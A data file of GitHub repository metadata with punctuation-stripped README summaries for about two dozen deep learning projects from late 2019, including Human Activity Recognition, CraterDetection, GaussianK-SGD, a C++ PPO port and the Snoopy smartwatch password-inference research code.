NirmalRajEganathan,Human-Activity-Recognition-using-sensor-data-through-Deep-learning-Techniques,n/a,Human Activity Recognition using sensor data through Deep learning Techniques Human activity recognition HAR is gaining importance due to wearables and sensors data associated with it Different from traditional Pattern Recognition methods deep learning can largely relieve the effort on designing features and can learn much more high level and meaningful features by training an end to end neural network You need to find the dataset from open resources which can provide you human activity data,2019-11-12T15:43:36Z,2019-12-02T10:22:01Z,Jupyter Notebook,NirmalRajEganathan,User,1,1,0,3,master,NirmalRajEganathan,1,0,0,0,0,0,0
a1178916307,deep-CNN-for-modulation-classification,n/a,Deep CNN for Modulation Classification File Description 1 RadioML 2016 10a i iii zip provides the dataset in MATLAB version in which i contains BPSK AM SSB AM DSB and 8PSK ii contains QAM16 PAM4 GFSK and CPFSK iii contains WBFM QPSK and QAM64 2 The convolution kernes at 1st and 4th layers gives all the visualized convolution kernels 3 The deep CNN mat is the covergent deep CNN model trained with proposed data augmentation method 4 The test m is used to evaluate the performance of deep CNN and should be run in MATLAB 2019a P S The manuscript has been submitted to the Multidimensional Systems and Signal Processing and full source code will be released after the paper has been accepted,2019-11-20T07:18:01Z,2019-11-21T15:42:39Z,MATLAB,a1178916307,User,1,1,0,23,master,a1178916307,1,0,0,0,0,0,0
matreshka15,build_a_neural_network_from_scratch,n/a,buildaneuralnetworkfromscratch Note This project is in its initial state which means all the libs and jupyter notebooks uploaded is usable but it doesn t cover all the areas of deep learning We re still trying to make it a better and more thorough lib You ll be welcomed to pull your own codesupgradesthoughtsnotes etc to this repo Anyway this is both a deep learning tutorial and a deep learning python lib How to use As the title indicated you can use the repo as a tutorial of how to build a neural network as well as a handy python lib to faster your implementation of machine learning programs Each directory includes corresponding files as its title shows For instance in the directory logisticregression what you will see is as below a jupyter notebook file which shows the whole process of implementing a computing unit that is a logistic regression function a py file which is the python library of functions which can help you build your own logistic regression faster pdf files which is my personal notes of deep learning It may help you understand the code better Other libraries required These are some other libraries required to run neural network codes on your terminal P s if you only need py files that is the lib files the only lib you will need is numpy You can use pip to install them For example you can input sudo pip3 install numpy on your terminal to install numpy lib All libraries involved in this repo have been listed below numpy As indicated before this is a must have stuff of almost all machine learning python programs Its can vectorize the implementation which can boost up the robustness and speed up your code matplotlib This is a library which can enable you to draw barscatter plots and so on in an efficient way If you re familiar with malab you ll be happy to use this I promise But if you re not it s totally okay because almost all the codes have been done for you sklearn This lib has some integrated dataset which may save us some time from collecting data And sometimes we ll use this lib to split up datasets etc,2019-11-15T06:46:52Z,2019-12-07T05:54:14Z,Jupyter Notebook,matreshka15,User,2,1,0,16,master,matreshka15,1,0,0,0,0,0,0
PNX007,Deep-Learing-from-Scratch,n/a,Deep Learing from Scratch This book is an introductory book in the true sense of deep learning It analyzes the principles and related technologies of deep learning in a simple way Using Python 3 in the book try not to rely on external libraries or tools to lead the reader to create a classic deep learning network from scratch so that readers can gradually understand deep learning in the process The book not only introduces the basic knowledge of deep learning and neural network concepts features but also provides an in depth explanation of error back propagation method convolutional neural network etc Practical practical skills automatic driving image generation reinforcement learning etc and why the deepening layer can improve the why of recognition accuracy This book is suitable for deep learning beginners to read but also can be used as a college textbook ch01 1 ch02 2 ch08 8 common dataset Python 3 x NumPy Matplotlib PythonPython 3 Python cd ch01 python man py cd ch05 python trainnueralnet py MIT http www opensource org licenses MIT http www ituring com cn book 1921,2019-11-19T02:35:43Z,2019-11-19T08:07:14Z,Jupyter Notebook,PNX007,User,1,1,0,6,master,PNX007,1,0,0,0,0,0,0
krantirk,deeplearning-from-scratch,n/a,Deep Learning from Scratch computer thinking snake A repository with neural networks and deep learning related concepts fully implemented in Python 3 using only numpy The code here available was developed only for learning and teaching purposes Feel free to use this for any project or work using the Apache 2 0 LICENSE Notebooks e detalhes sobre site em portugus disponveis na branch web site https github com mari linhares deep python scratch tree web site Crditos do template utilizado no site Copyright c 2017 Peter Carbonetto Gao Wang All source code and software in this repository are made available under the terms of the MIT license https opensource org licenses MIT ipynb website was developed by Peter Carbonetto and Gao Wang Dept of Human Genetics University of Chicago John Blischak https github com jdblischak Matthew Stephens http stephenslab uchicago edu and others have also contributed to the development of this software,2019-12-01T08:21:38Z,2019-12-02T18:24:43Z,Python,krantirk,User,1,1,0,46,master,mari-linhares,1,0,0,0,0,0,0
terryum,Deep_Ensemble_CNN_for_Imbalance_Labels,n/a,DeepEnsembleCNNforImbalanceLabels This is an example code of deep ensemble learning for overcoming imbalance labe For more details please refer to the the paper below Pfister Franz MJ et al High Resolution Motor State Detection in Parkinson s Disease Using Convolutional Neural Networks Scientific Report under review Um Terry Taewoong et al Parkinson s Disease Assessment from a Wrist Worn Wearable Sensor in Free Living Conditions Deep Ensemble Learning and Visualization arXiv preprint arXiv 1808 02870 2018 arXiv https arxiv org abs 1808 02870 In the paper mentioned we used real world wearable sensor data collected from 30 Parkinson s patients Since we are not able to make patient data available in public we released an example code that works with MNIST data You can run our example code with Google Colab https colab research google com Dependency You need to first download rotated MNIST dataset from here https sites google com a lisa iro umontreal ca publicstatictwiki variations on the mnist digits and save it on your Google Drive Our example code will download rotated MNIST dataset from your google drive and also save trained models to your google drive License You can freely modify this code for your own purpose However please leave the citation information untouched when you redistributed the code to others If this code helps your research please cite the paper articleTerryUmEnsembleCNN2018 author Terry Taewoong Um and Franz Michael Josef Pfister and Daniel Christian Pichler and Satoshi Endo and Muriel Lang and Sandra Hirche and Urban Fietzek and Dana Kulic title Parkinson s Disease Assessment from a Wrist Worn Wearable Sensor in Free Living Conditions Deep Ensemble Learning and Visualization journal CoRR volume abs 1808 02870 year 2018 url http arxiv org abs 1808 02870 archivePrefix arXiv eprint 1808 02870 timestamp Sun 02 Sep 2018 15 01 54 0200 biburl https dblp org rec bib journals corr abs 1808 02870 bibsource dblp computer science bibliography https dblp org,2019-11-20T09:33:28Z,2019-12-04T04:20:36Z,Jupyter Notebook,terryum,User,1,1,1,7,master,terryum,1,0,0,0,0,0,0
WangSong960913,CraterDetection,n/a,CraterDetection Crater detection algorithm based on deep learning and semantic segmentation Our paper is being submitted We will publish the link after the paper is published Our algorithm contains three main steps Firstly We need to generate experiment data Our original moon DEM image can download in https pan baidu com s 1eSpBLrA Upqr5qjf6r8w and We random clipe the lunar DEM image to generate data Secondly using Simple ResUNet detects crater edges in lunar images Then it uses template matching algorithm to compute the position and size of craters Finally we draw the images of recognized craters and record the location and radius of the craters Dependencies Our code is based on python3 6 We use Keras 24 as the deep learning framework pip install r requirement txt Generate Data python gendata py train data set savename data train number 30000 valid data savename data valid set number 3000test data savename data dev set number 3000 Train python train py you can adjust train image number batch size epochs and model save path in train py If you want to change model you can change code in modeltrain py dlinknet linknet unet deep residual net simple resunet Detect python runextractcraters py You should change modelName value in runextractcraters py to chose your trained model ExperimentResult The trained model can be downloaded in https pan baidu com s 1eSpBLrA Upqr5qjf6r8w image https github com WangSong960913 CraterDetection data img1 png image https github com WangSong960913 CraterDetection data img2 png Model Simple ResUNet Simple ResUNet 2 Ari S 19 Deep Residual U Net 21 Parameter 23 740 305 36 856 401 10 278 017 23 562 225 Recall 81 16 80 15 76 10 76 67 Precision 75 37 77 51 83 16 77 86 F1 Score 76 29 77 07 77 95 75 59 F2 Score 78 54 78 37 76 49 76 90 Authors Wang Song Email 1140479300 qq com Wei Chao Zhang Hong Fu JinWu Shi Linrui References 1 Ari S Mohamad A D Chenchong Z et al Lunar Crater Identification via Deep Learning J Icarus 2018 S0019103518301386 2 Zhang Z Liu Q Wang Y Road Extraction by Deep Residual U Net J IEEE Geoscience and Remote Sensing Letters 2018 1 5 3 Ronneberger O Fischer P Brox T U Net Convolutional Netw orks for Biomedical Image Segmentation J Springer International Publishing 2015 4 Zhou L Zhang C Ming W D LinkNet LinkNet with Pretrained Encoder and Dilated Convolution for High Resolution Satellite Imagery Road Extraction C 2018 IEEE CVF Conference on Computer Vision and Pattern Recognition Workshops CVPRW 2018 Thanks Thanks for you star and download If you have any good opinions or questions please contact me Thank you,2019-11-22T02:43:54Z,2019-11-24T13:13:12Z,Python,WangSong960913,User,1,1,0,13,master,WangSong960913,1,0,0,0,0,1,0
hclhkbu,GaussianK-SGD,n/a,GaussianK SGD Introduction This repository contains the codes for the paper Understanding Top k Sparsification in Distributed Deep Learning Key features include Distributed training with gradient sparsification Measurement of gradient distribution on various deep learning models including feed foward neural networks FFNs CNNs and LSTMs A computing efficient top k approximation called gaussian k for gradient sparsification For more details about the algorithm please refer to our papers Installation Prerequisites Python 2 or 3 PyTorch 0 4 OpenMPI 3 1 https www open mpi org software ompi v3 1 Horovod 0 14 https github com horovod horovod Quick Start git clone https github com hclhkbu GaussianK SGD git cd GaussianK SGD HOROVODGPUALLREDUCE NCCL pip install no cache dir horovod optional if horovod has been installed pip install r requirements txt dnn resnet20 nworkers 4 compressor topk density 0 001 run sh Assume that you have 4 GPUs on a single node and everything works well you will see that there are 4 workers running at a single node training the ResNet 20 model with the Cifar 10 data set using SGD with top k sparsification Papers S Shi X W Chu K Cheung and S See Understanding Top k Sparsification in Distributed Deep Learning 2019 Referred Models Deep speech https github com SeanNaren deepspeech pytorch https github com SeanNaren deepspeech pytorch PyTorch examples https github com pytorch examples https github com pytorch examples,2019-11-15T05:56:29Z,2019-11-26T14:04:36Z,Python,hclhkbu,User,2,1,2,4,master,shyhuai#hclhkbu,2,0,0,0,0,0,0
hatim523,DL-on-MNIST-Digit-Dataset---Tensorflow-Basics,n/a,,2019-12-09T12:23:30Z,2019-12-09T12:30:10Z,Jupyter Notebook,hatim523,User,1,1,0,0,master,,0,0,0,0,0,0,0
forhadsidhu,Image_Annotation_tool,annotations#cpp#deep-learning#image-annotation#image-annotation-tool#qt#qt-creator#qt5-gui,ImageAnnotation https github com forhadsidhu ImageAnnotationtool blob master Screenshot 20 3 png BUTTON USES Buttons Uses polygon for annotating object as polygon shape rectangle for annotating object as rectangle shape submit label after annotating an object sumbit label name SAVE for saving the annotation pressed this button cancel for remove the previous annotation pressed this button Open for opening the folder directory prev for opening the previous image Next for opening the Next image Rules and issues There are some issues which will be solved soon After completing the annotating the object press right button For cancelling this object annotation press cancel button To want save all annotation till now press save button All annatation will save on the text file in input directory smile Happy Coding Contributing twohearts twohearts twohearts twohearts twohearts twohearts twohearts,2019-12-04T17:04:55Z,2019-12-10T02:16:39Z,C++,forhadsidhu,User,1,1,0,8,master,forhadsidhu,1,0,0,0,0,0,0
youngjie-cho,csci1470final,n/a,Question Answering Corpus This repository contains a script to generate question answer pairs using CNN and Daily Mail articles downloaded from the Wayback Machine For a detailed description of this corpus please read Teaching Machines to Read and Comprehend arxiv Hermann et al NIPS 2015 Please cite the paper if you use this corpus in your work Bibtex inproceedingsnips15hermann author Karl Moritz Hermann and Tom avs Kovcisk y and Edward Grefenstette and Lasse Espeholt and Will Kay and Mustafa Suleyman and Phil Blunsom title Teaching Machines to Read and Comprehend url http arxiv org abs 1506 03340 booktitle Advances in Neural Information Processing Systems NIPS year 2015 Download Processed Version In case the script does not work you can also download the processed data sets from http cs nyu edu kcho DMQA This should help in situations where the underlying data is not accessible Wayback Machine partially down Running the Script Prerequisites Python 2 7 wget libxml2 libxslt python dev and virtualenv libxml2 must be version 2 9 1 You can install libxslt from here http xmlsoft org libxslt downloads html http xmlsoft org libxslt downloads html sudo pip install virtualenv sudo apt get install python dev Download Script mkdir rc data cd rc data wget https github com deepmind rc data raw master generatequestions py Download and Extract Metadata wget https storage googleapis com deepmind data 20150824 data tar gz O tar xz strip components 1 The news article metadata is 1 GB Enter Virtual Environment and Install Packages virtualenv venv source venv bin activate wget https github com deepmind rc data raw master requirements txt pip install r requirements txt You may need to install libxml2 development packages to install lxml sudo apt get install libxml2 dev libxslt dev Download URLs python generatequestions py corpus cnn dailymail mode download This will download news articles from the Wayback Machine Some URLs may be unavailable The script can be run again and will cache URLs that already have been downloaded Generation of questions can run without all URLs downloaded successfully Generate Questions python generatequestions py corpus cnn dailymail mode generate Note this will generate 1 000 000 small files for the Daily Mail so an SSD is preferred Questions are stored in cnn dailymail questions in the following format URL Context Question Answer Entity mapping Deactivate Virtual Environment deactivate Verifying Test Sets wget https github com deepmind rc data raw master expected cnn dailymail test txt comm 3 cat expected cnn dailymail test txt ls cnn dailymail questions test The filenames of the questions in the first column are missing generated questions No output means everything is downloaded and generated correctly arxiv http arxiv org abs 1506 03340,2019-11-14T00:15:30Z,2019-12-12T00:31:44Z,Python,youngjie-cho,User,2,1,0,36,master,pengzhengyi#youngjie-cho#knambara#ragnaag,4,0,0,1,0,1,1
ChristopherLu,snoopy,n/a,License CC BY NC SA 4 0 https img shields io badge license CC4 0 blue svg https creativecommons org licenses by nc sa 4 0 legalcode Python 2 7 https img shields io badge python 2 7 green svg Snoopy Sniffing Your Smartwatch Passwords via Deep Sequence Learning https arxiv org pdf 1912 04836 pdf ACM UbiComp 2018 Introduction This is the code and dataset used by Snoopy an attack system for password inference on smartwatch Data Download the data through this Dropbox link https www dropbox com s 288hotqkig7e3w9 dataset zip dl 0 Unzip the downloaded file in the project directory and check the following subfolders 1 train 33 000 labelled motion samples from 147 common swiped pattern locks Used for network training 2 test 1 500 samples containing both seen 50 and unseen 64 pattern locks during training 3 val 3 800 labelled motion samples from 61 pattern locks for model selection Dependency Our code has been tesed on Keras 2 0 8 with tensorflow gpu 1 9 0 as backend Install required dependency as per the following setps 1 Create the py27snoopy Conda environment conda env create f environment yaml 2 Install the specific version of recurrentshop from this fork https github com ChristopherLu recurrentshopbak 3 Go to this fork https github com farizrahman4u seq2seq and follow its instruction to install seq2seq Run the code FIRST Change the config file config ini to decide network params and regularization strategies To train the attention based lstm model python trainattseq py To train the standard lstm model python trainseq py To test the model python test py modelname hdf5 For example python test py modelattention320 005200333360 12 hdf5 There are some pre baked model examples docked in the model directory Citation If you find this repository and our data useful please cite our paper articlelu2018snoopy title Snoopy Sniffing your smartwatch passwords via deep sequence learning author Lu Chris Xiaoxuan and Du Bowen and Wen Hongkai and Wang Sen and Markham Andrew and Martinovic Ivan and Shen Yiran and Trigoni Niki journal Proceedings of the ACM on Interactive Mobile Wearable and Ubiquitous Technologies volume 1 number 4 pages 152 year 2018 publisher ACM Acknowledgements This code partially builds on Seq2Seq https github com farizrahman4u seq2seq,2019-12-10T10:24:13Z,2019-12-14T13:20:28Z,Python,ChristopherLu,User,1,1,0,8,master,ChristopherLu,1,0,0,0,0,0,0
youngbinYoon,MegaCody_OnlyMLcode,n/a,,2019-12-10T03:37:06Z,2019-12-11T04:47:31Z,Jupyter Notebook,youngbinYoon,User,1,1,0,3,master,youngbinYoon,1,0,0,0,0,0,0
apra,anomaly_detection_vae,anomaly-detection#deep-learning#time-series#vae,Time Series Anomaly Dectection using a Variational Inference Approach In this project we want to achieve anomaly detection in time series using a variational inference approach,2019-11-17T17:27:24Z,2019-12-01T16:17:33Z,Jupyter Notebook,apra,User,1,1,1,17,master,apra#hviidhenrik,2,0,0,0,0,0,1
borchero,BxTorch,n/a,BxTorch BxTorch is a high level library for large scale machine learning in PyTorch https pytorch org It is engineered both to cut obsolete boilerplate code while preserving the flexibility of PyTorch to create just about any deep learning model Installation BxTorch is available on PyPi so simply run the following command bash pip install bxtorch Features Generally BxTorch provides an object oriented approach to abstracting PyTorch s API The core design objective is to provide an API both as simple and as extensible as possible The goal of this library is to be able to iterate between different models easily instead of squeezing out milliseconds where it is not required Still being focused on large scale machine learning BxTorch aims to make it as easy as possible working with large datasets This includes out of the box multi GPU support where the user does not need to write a single line of code Currently BxTorch only provides means for running training inference on a single machine In case this is insufficient you might be better off using PyTorch s distributed package directly It must be emphasized that BxTorch is not meant to be a wrapper for PyTorch as Keras is for TensorFlow it only provides extensions Documentation Examples of the usage of BxTorch can be found in the docs folder docs Method documentation is currently only available as docstrings bxtorch License BxTorch is licensed under the MIT License LICENSE,2019-12-06T01:13:45Z,2019-12-09T18:11:58Z,Python,borchero,User,1,1,0,11,master,borchero,1,0,5,0,0,0,0
pragya1010,Disease-Prediction,n/a,Disease Prediction Application Based on Medical Imaging implementing Deep Learning and Python Diagnosis for Breast Cancer Malaria and Parkinson s disease The problem of error prone diagnosis could be solved using machine learning algorithm that can predict the disease from the medical image without the need for any other additional hardware We are implementing Neural networks using Keras Random Forest Model and Image Analysis using OpenCV To use the package 1 pip install requirements txt 2 Run api py The code will navigate to Index html where u can login as a new user and use the application,2019-11-09T19:31:19Z,2019-12-08T19:24:51Z,CSS,pragya1010,User,2,1,0,9,master,pragyajha#pragya1010,2,0,0,0,0,0,0
WenLi-o00o,medical-image-code,n/a,medical image code the usually used medical image processing codes for deep learning metrics including mae mse psnr and ssim pngtonpy convert png images to a npy file Unet simple Unet model which can be used 2 to 1 create 2 channels npy file,2019-12-04T22:30:18Z,2019-12-04T22:46:55Z,Python,WenLi-o00o,User,1,1,0,6,master,WenLi-o00o,1,0,0,1,0,1,0
akhilpandey95,interpretability,n/a,interpretability Approaches for conceptualizing a framework for interpreting deep learning models,2019-12-02T02:59:24Z,2019-12-04T05:53:06Z,Python,akhilpandey95,User,1,1,0,8,master,akhilpandey95,1,0,0,2,0,0,0
winlaic,winlaic,n/a,,2019-12-13T10:58:04Z,2019-12-13T12:18:39Z,Python,winlaic,User,1,1,0,1,master,winlaic,1,0,0,0,0,0,0
deepraj1729,Gates-using-Neural-Nets-and-Perceptrons,n/a,Gates using Neural Nets and Perceptrons A Simple model to implement Gates using 1 Multi layered Neural Networks 2 Linear Threshold gates Perceptron Required Modules 1 tensorflow CPU or GPU 2 keras CPU or GPU 3 sklearn 4 numpy 5 pandas,2019-11-17T19:44:48Z,2019-12-06T14:26:25Z,Python,deepraj1729,User,1,1,0,10,master,deepraj1729,1,0,0,0,0,0,0
withai,Graph-Neural-Networks,deep-learning#graph-attention-networks#graph-convolutional-neural-networks#graph-neural-networks#neural-networks,Graph Neural Networks We present different Neural Network modules to apply deep learning on graph data structures The different neural network modules include the graph convolution and graph attention Dependency Python 3 7 PyTorch 1 1 0 library Deep learning library numpy Usage bash In python script import GNN module from nn,2019-11-21T03:47:58Z,2019-11-21T16:21:51Z,Python,withai,User,1,1,0,3,master,withai,1,0,0,0,0,0,0
LionerAI,Neural-network-notes,n/a,,2019-12-11T09:25:22Z,2019-12-11T09:35:06Z,n/a,LionerAI,User,1,1,0,1,master,LionerAI,1,0,0,0,0,0,0
Antymon,ppo_cpp,n/a,PPOCPP What is it PPOCPP is a C version of a Proximal Policy Optimization algorithm Schulman2017 with some additions It was partially ported from Stable Baselines Hill2018 Deep Reinforcement Learning suite with elements of the OpenAI Gym framework Brockman2016 in a form of a Tensorflow Abadi2016 graph executor It additionally features an example environment based on DART simulation engine Lee2018 with a hexapod robot Cully2015 tasked to walk as far as possible along X axis example recording https drive google com open id 1dsVrjTDdhqWkh40eF1vscetfUyJUlVm Why Performance The interesting thing is that PPOCPP executes 2 3 times faster than corresponding Python implementation when running on the same example environment with the same number of threads Originally however PPOCPP was set up for the sake of DRL Neuroevolution comparison in an unpublished yet project Is it optimized Not at all Particularly in the multithreaded case there might be some easy wins to further boost performance e g by going away from ported ideas and leveraging thread safety of Tensorflow s Session Run or promoting immutability by copying network weights How was it tested so far Single threaded version with both hexapod environments was run in many instances on a High Performance Computing cluster for a grand total of 50 000 to 100 000 CPU hours yielding believable results How can I use it for my work You should be able to easily check the examples below however if you want to use it in different settings you will probably need 3 things Make your environment inherit from Env abstract class under envenv hpp Modify or replace main ppo2 cpp which creates instance of an environment and passes it to PPO Create own computational graph and potentially make some small modifications to the core algorithm if using more involved policies currently implementation supports only MLP policies Graph generation is mentioned below Where is the multi threaded version At the moment multi threaded version lives on the parallel branch because of the hexapod environment which proved to be annoyingly leaky in this setup State of the project This a proof of concept that could benefit from a number of improvements Let me know if this project is useful for you Recommended dev setup and dependencies Except for ppo2 cpp and potentially the hexapod environments core PPO code should be easily portable Two main dependencies are Eigen Guennebaud2010 and Tensorflow Abadi2016 If the hexapod environment considered then also DART Lee2018 Containers additionally use Sferes2 Mouret2010 framework and Python WAF build system Nagy2010 which are the outcome of the history of the project and could be ditched A most solid way to examine container dependencies is to read the project s singularity singularity def file and its parent To run the examples a Linux system supporting Singularity container system is needed preferably Ubuntu 18 04 LTS operating system Singularity https sylabs io guides 3 3 user guide quickstart html quick installation steps Kurtzer2016 containerization environment Examples Training gaits To start the PPO training you need to install Singularity https sylabs io guides 3 3 user guide quickstart html quick installation steps Kurtzer2016 version 3 3 or later at the moment available only for Linux systems For your convenience a well performing PPO setup was committed in the PPO repository Paying attention to the very long argument list to the SIMG file type in bash git clone https gitlab doc ic ac uk sb5817 ppocpp git cd ppocpp singularity buildfinalimage sh very long argument list final simg 0 ppocpp 45 lr0 0004cr0 1610ent0 0007 resources ppocl graphs ppocpp 45 lr0 0004cr0 1610ent0 0007 meta txt steps 75000000 numsaves 75 lr 0 000393141171574037 ent 0 0007160293279937344 cr 0 16102319952328978 numepochs 10 batchsteps 65536 cl This will trigger a single training run of a closed loop PPO for 75M frames On a modern CPU this will take around 1 day of computation 10GB memory leak in the example environment and less than 2 logical cores You can check the PNG image with an example learning curve available in the repository as resources ppocl png to see what to expect over time The results with the log file will be available under results in the same directory as the SIMG file To display help of the main executable through the SIMG file singularity run app help simg Inside of results directory there will be tensorboard directory created with episode rewards logs Tensorboard utility that is installed with Python Tensorflow Abadi2016 can spawn a web server which is able to visualize those logs at runtime by simply pointing to the mentioned directory tensorboard logdir tensorboard port 6080 Upon starting the server weblink will be displayed in the output to render the visualization in a browser You can of course change passed parameters however if you wish to change the graph structure you will need to regenerate the graph file MLP git clone https gitlab doc ic ac uk sb5817 stable baselines git cd stable baselines python3 stablebaselines ppo2 graphgenerator py 4 5 observationspacesize 18 savepath graphs ppocpp 45 lr0 0004cr0 1610ent0 0007 meta txt learningrate 0 000393141171574037 entcoef 0 0007160293279937344 cliprange 0 16102319952328978 This will generate a closed loop graph similar to the one used in the training initiated above The generator will write the file with respect to your Stable Baselines Hill2018 repository You need to point to this file when calling into the PPO SIMG file In order to see what parameters are accepted from within the repository call python3 stablebaselines ppo2 graphgenerator py help If you require policy other than MLP modifications to both graphgenerator and core PPOCPP may be needed however as long as the Policy is originally supported by Stable Baselines those changes shouldn t be too challenging The reason for forking Stable Baselines was mainly to name tensors which need to be referred to on the C side but also to introduce a thin graph generator layer over the original implementation extended with computational graph export import functionality Visualizing gaits To start the PPO gait visualization you need to install Singularity https sylabs io guides 3 3 user guide quickstart html quick installation steps Kurtzer2016 version 3 3 or later at the moment available only for Linux systems For your convenience a well performing PPO setup was committed in the PPO repository The following assumes you are not running in the headless mode Paying attention to the very long argument list to the SIMG file type in bash git clone https gitlab doc ic ac uk sb5817 ppocpp git cd ppocpp singularity startcontainer sh cd git sferes2 waf exp ppocpp build exp ppocpp ppocpp cl p exp ppocpp resources ppocl 2019 08 2021130128590 pkl 71 This will trigger a window in which hexapod will be visualized in 5 second sessions looping forever Close through the Ctrl C key combination If you close the window manually the simulation will just run headless just like in the training process You can use help to see the full listing of available options Serialization files are created during the training process under checkpoints directory nested under results with a name according to the chosen frame interval typically 1 save per 1M frames If you are running in a headless mode you can try running visuserver sh from any directory within the container preferably as a background process using to start a VNC VNC server This will bind to the localhost on port 6080 of the host machine where visualization will be rendered As a practitioners note it is advisable to check if VNC started correctly and restart it if it did not It is also not recommended to do this when not in headless mode due to the deep integration of Singularity Kurtzer2016 with the host machine that can result in undesirable side effects Related repositories docker pydart2hexapodbaselines https gitlab doc ic ac uk sb5817 docker dart gym Docker Merkel2014 file describing analogous Python setup In order to try out an example hexapod experiment run python3 runhexapod py inside of git stable baselines directory stablebaselines https gitlab doc ic ac uk sb5817 stable baselines Fork of Stable Baselines Hill2018 deep RL algorithm suite Includes modified PPO2 algorithm Schulman2017 and utilities to export Tensorflow Abadi2016 meta graph gym dartenv https gitlab doc ic ac uk sb5817 dartenv Hexapod setup as a Python based environment within OpenAI Gym Brockman2016 framework pydart2 https gitlab doc ic ac uk sb5817 pydart2 Fork of Pydart2 Ha2016 Python layer over C based DART Lee2018 simulation framework Modified to enable experiments with hexapod References 1 Martin Abadi Paul Barham Jianmin Chen Zhifeng Chen Andy Davis JeffreyDean Matthieu Devin Sanjay Ghemawat Geoffrey Irving Michael Isard et al Tensorflow A system for large scale machine learning In12thUSENIXSym posium on Operating Systems Design and Implementation OSDI16 pages265283 2016 2 Greg Brockman Vicki Cheung Ludwig Pettersson Jonas Schneider John Schulman Jie Tang and Wojciech Zaremba Openai gym arXiv preprintarXiv 1606 01540 2016 3 Antoine Cully Jeff Clune Danesh Tarapore and Jean Baptiste Mouret Robots that can adapt like animals Nature 521 7553 503 2015 4 Gael Guennebaud Benoit Jacob et al Eigen v3 http eigen tuxfamily org 2010 5 Sehoon Ha Pydart2 A python binding of DART https github com sehoonha pydart2 2016 6 Ashley Hill Antonin Raffin Maximilian Ernestus Adam Gleave Rene Traore Prafulla Dhariwal Christopher Hesse Oleg Klimov Alex Nichol Matthias Plap pert Alec Radford John Schulman Szymon Sidor and Yuhuai Wu Stablebaselines https github com hill a stable baselines 2018 7 Gregory M Kurtzer Singularity 2 1 2 Linux application and environment containers for science August 2016 8 Jeongseok Lee Michael Grey Sehoon Ha Tobias Kunz Sumit Jain Yuting Ye Siddhartha Srinivasa Mike Stilman and C Karen Liu Dart Dynamic animation and robotics toolkit The Journal of Open Source Software 3 500 02 2018 9 Dirk Merkel Docker Lightweight Linux containers for consistent development and deployment Linux J 2014 239 March 2014 10 Jean Baptiste Mouret and Stephane Doncieux SFERESv2 Evolvin in the multi core world InProc of Congress on Evolutionary Computation CEC pages 40794086 2010 11 Thomas Nagy The WAF Book 2010 12 John Schulman Filip Wolski Prafulla Dhariwal Alec Radford and Oleg Klimov Proximal policy optimization algorithms arXiv preprint arXiv 1707 06347 2017,2019-11-07T07:10:28Z,2019-12-08T15:50:24Z,C++,Antymon,User,1,1,1,137,master,Antymon,1,0,0,0,2,0,0
kirubarajan,transformer_vs_rnn,nlp#rnn#transformers,Is Attention All You Need An analysis on the trade offs between NLP s standard neural models Abstract Transformer models have recently become the state of the art for a variety of natural language processing tasks e g summarization dialogue translation They offer computational benefits over standard recurrent and feed forward neural network architectures pertaining to parallelization and parameter size In this paper we analyze the performance gains of Transformer and LSTM models as their size increases in an effort to determine when researchers should choose Transformer architectures over recurrent neural networks Related Work The most prolific baselines for time series and continuous data are recurrent neural networks due to their ability to process sequential data In particular most tasks involve the use of LSTM Long Short Term Memory cells which allows recurrent neural networks to learn long term dependencies through the data as well as preventing the vanishing gradient problem which plague standard RNN architectures An improvement to the standard LSTM architecture is the mechanism of attention which allows the network to calculate the importance of certain parts of the data e g text in relation to some other tertiary data e g text Attention based architecture for neural machine translation was developed by Banhandau et al in 2014 and subsequently achieved state of the art performance in a variety of tasks later becoming the gold standard for sequential processing Transformer models are feedforward encoder decoder architectures consisting of layers of self attention Transformer models were originally developed by Vastwani et al in 2017 as a state of the art architecture for multilingual translation and have since been used in a variety of seq2seq tasks including dialogue summarization and named entity recognition The importance of Transformer networks comes from their relative simplicity consisting namely of feed forward attention without any recurrent units This allows Transformer networks to train much larger volumes of data due to better parallelization As such Transformer models also benefit from larger parameter spaces which can be tuned more accurately due to the increase of capacity of training data Although Transformer networks do claim the state of the art most implementations are very large 1 BILLION parameters and are trained on corpi an order of magnitude larger than before This makes it difficult to accurately compare performance gains of Transformer networks over those of LSTM networks In this project we aim to determine how the performance both accuracy and efficiency scale with both parameter size and corpus size References https arxiv org abs 1706 03762 https arxiv org abs 1910 01108 https arxiv org pdf 1909 11687 pdf,2019-11-16T18:54:27Z,2019-11-17T02:31:49Z,Python,kirubarajan,User,2,1,0,6,master,kirubarajan,1,0,0,0,0,0,0
TannerGilbert,Google-Coral-Edge-TPU,n/a,Google Coral Edge TPU Examples https lh3 googleusercontent com 83lPm0ffoxJZX63HX9EzMDKKtgLhzR4ym4iKOpudD5LuMQd329olIfkV3gcGRSb71NrPabWyKpo52YZpzO54Iic1AGYvFp9l7tAnGk w1000 rw Google Coral edge devices allow us to run deep learning models on edge devices like the Raspberry Pi This repository shows you how to use a Coral Edge TPU for different applications including Image Classification and Object Detection Installation To use the EdgeTPU you need the EdgeTPU API https coral withgoogle com software debian packages as well as the Tensorflow Lite Runtime https www tensorflow org lite guide python installjustthetensorflowliteinterpreter Image Classification Image Classification with the EdgeTPU API edgetpuapiimageclassification py Image Classification with the Tensorflow Lite Runtime tfliteimageclassification py Object Detection Object Detection with the EdgeTPU API edgetpuapiobjectdetection py Object Detection with the Tensorflow Lite Runtime tfliteobjectdetection py Author Gilbert Tanner Support me License This project is licensed under the MIT License see the LICENSE md LICENSE file for details,2019-11-10T11:50:33Z,2019-11-30T05:07:50Z,Python,TannerGilbert,User,1,1,0,2,master,TannerGilbert,1,0,0,0,0,0,0
qodatecnologia,rede-neural-em-20-linhas,n/a,,2019-11-26T10:08:44Z,2019-12-04T14:42:53Z,Python,qodatecnologia,User,1,1,0,1,master,qodatecnologia,1,0,0,0,0,0,0
nmheim,rodent-poster,n/a,poster main png,2019-12-02T19:48:25Z,2019-12-05T15:31:08Z,TeX,nmheim,User,1,1,0,15,two-cols,nmheim,1,0,0,0,0,0,0
